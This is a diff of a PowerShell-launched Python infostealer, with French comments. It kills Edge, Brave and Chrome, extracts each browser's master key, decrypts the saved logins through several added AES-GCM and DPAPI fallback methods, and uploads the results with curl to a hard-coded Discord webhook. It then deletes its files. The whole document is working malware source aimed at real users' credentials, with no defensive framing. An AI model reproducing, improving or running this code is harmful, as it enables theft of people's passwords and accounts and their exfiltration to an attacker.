@@ -7,10 +7,8 @@ function Send-Discord {
 
 Send-Discord "🟢 START - $env:COMPUTERNAME"
 
-# Tuer TOUS les processus navigateurs de manière agressive
-Send-Discord "🔪 Killing browsers..."
 Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
-Start-Sleep 7  # Plus long pour s'assurer que tout est fermé
+Start-Sleep 7
 
 try {
     $pyPath="$env:TEMP\py"
@@ -40,10 +38,9 @@ try {
     cd $pyPath
     
     @'
-import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,sys
+import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
 from Crypto.Cipher import AES
 
-# Discord webhook
 WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
 
 def send(msg):
@@ -69,6 +66,58 @@ except:
 import locale
 language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
 
+def decrypt_password(enc_password, key):
+    """Essaie plusieurs méthodes de déchiffrement"""
+    
+    # Méthode 1: Format v10/v11 standard (Chrome/Edge)
+    try:
+        nonce = enc_password[3:15]
+        ciphertext = enc_password[15:-16]
+        tag = enc_password[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
+    except:
+        pass
+    
+    # Méthode 2: DPAPI pur (ancien format)
+    try:
+        return win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+    except:
+        pass
+    
+    # Méthode 3: Format Brave alternatif (skip prefix différent)
+    try:
+        # Brave peut avoir un offset différent
+        nonce = enc_password[0:12]
+        ciphertext = enc_password[12:-16]
+        tag = enc_password[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
+    except:
+        pass
+    
+    # Méthode 4: Sans vérification MAC (moins sûr mais fonctionne parfois)
+    try:
+        nonce = enc_password[3:15]
+        ciphertext = enc_password[15:-16]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
+    except:
+        pass
+    
+    # Méthode 5: Brave avec offset v10
+    try:
+        if enc_password[:3] == b'v10':
+            nonce = enc_password[3:15]
+            ciphertext = enc_password[15:]
+            # Essayer sans tag
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            return cipher.decrypt(ciphertext[:-16]).decode('utf-8', errors='ignore')
+    except:
+        pass
+    
+    return None
+
 def decrypt_browser(db_path, state_path, browser_name):
     results = []
     errors = []
@@ -88,7 +137,6 @@ def decrypt_browser(db_path, state_path, browser_name):
         return results, errors
     
     try:
-        # Extraire la clé
         with open(state_path, 'r', encoding='utf-8') as f:
             key_data = json.load(f)
         
@@ -97,7 +145,6 @@ def decrypt_browser(db_path, state_path, browser_name):
         
         send(f"✅ {browser_name}: Key extracted ({len(key)} bytes)")
         
-        # Copier la DB avec retry
         temp_db = f"temp_{browser_name}.db"
         for attempt in range(5):
             try:
@@ -108,7 +155,7 @@ def decrypt_browser(db_path, state_path, browser_name):
                 break
             except Exception as e:
                 if attempt == 4:
-                    msg = f"❌ {browser_name}: Failed to copy DB after 5 tries - {str(e)}"
+                    msg = f"❌ {browser_name}: Failed to copy DB - {str(e)}"
                     send(msg)
                     errors.append(msg)
                     return results, errors
@@ -116,7 +163,6 @@ def decrypt_browser(db_path, state_path, browser_name):
         
         send(f"✅ {browser_name}: DB copied")
         
-        # Connexion SQLite avec timeout élevé
         conn = sqlite3.connect(temp_db, timeout=120)
         cursor = conn.cursor()
         
@@ -132,21 +178,13 @@ def decrypt_browser(db_path, state_path, browser_name):
             if not enc_password:
                 continue
             
-            try:
-                # Déchiffrement AES-GCM
-                nonce = enc_password[3:15]
-                ciphertext = enc_password[15:-16]
-                tag = enc_password[-16:]
-                
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
-                
+            password = decrypt_password(enc_password, key)
+            
+            if password:
                 results.append(f"[{browser_name}] {url}\nUsername: {username}\nPassword: {password}\n")
                 decrypted_count += 1
-                
-            except Exception as e:
+            else:
                 failed_count += 1
-                # Ne pas logger chaque échec individuel pour éviter le spam
         
         conn.close()
         os.remove(temp_db)
@@ -161,7 +199,6 @@ def decrypt_browser(db_path, state_path, browser_name):
     
     return results, errors
 
-# Traiter tous les navigateurs
 all_results = []
 all_errors = []
 
@@ -173,8 +210,6 @@ if os.path.exists(edge_db):
     r, e = decrypt_browser(edge_db, edge_state, "EDGE")
     all_results.extend(r)
     all_errors.extend(e)
-else:
-    send("⚠️ Edge not installed")
 
 # BRAVE
 brave_base = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
@@ -184,8 +219,6 @@ if os.path.exists(brave_db):
     r, e = decrypt_browser(brave_db, brave_state, "BRAVE")
     all_results.extend(r)
     all_errors.extend(e)
-else:
-    send("⚠️ Brave not installed")
 
 # CHROME
 chrome_base = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
@@ -195,10 +228,7 @@ if os.path.exists(chrome_db):
     r, e = decrypt_browser(chrome_db, chrome_state, "CHROME")
     all_results.extend(r)
     all_errors.extend(e)
-else:
-    send("⚠️ Chrome not installed")
 
-# Générer le rapport final
 info = f"""{'='*60}
 SYSTEM INFORMATION
 {'='*60}
@@ -230,11 +260,8 @@ if all_results:
 else:
     with open("passwords.txt", "w", encoding="utf-8") as f:
         f.write(info)
-        f.write("No passwords found.\n\n")
-        if all_errors:
-            f.write("ERRORS:\n")
-            f.write("\n".join(all_errors))
-    send("⚠️ No passwords extracted - uploading error log")
+        f.write("No passwords found.\n")
+    send("⚠️ No passwords found")
     print("OK")
 '@ | Out-File "extractor.py" -Encoding UTF8
     
@@ -242,16 +269,15 @@ else:
     $result = .\python.exe extractor.py 2>&1
     
     if ($result -match "OK") {
-        Send-Discord "📤 Uploading results..."
         curl.exe -F "file=@passwords.txt" $wh 2>$null
-        Send-Discord "✅ UPLOAD COMPLETE"
+        Send-Discord "✅ COMPLETE"
         Remove-Item passwords.txt,extractor.py -Force -EA 0
     } else {
-        Send-Discord "❌ Python script failed: $result"
+        Send-Discord "❌ Failed: $result"
     }
     
 } catch {
-    Send-Discord "❌ PowerShell error: $($_.Exception.Message)"
+    Send-Discord "❌ Error: $($_.Exception.Message)"
 }
 
-Send-Discord "🧹 FINISHED"
+Send-Discord "🧹 DONE"
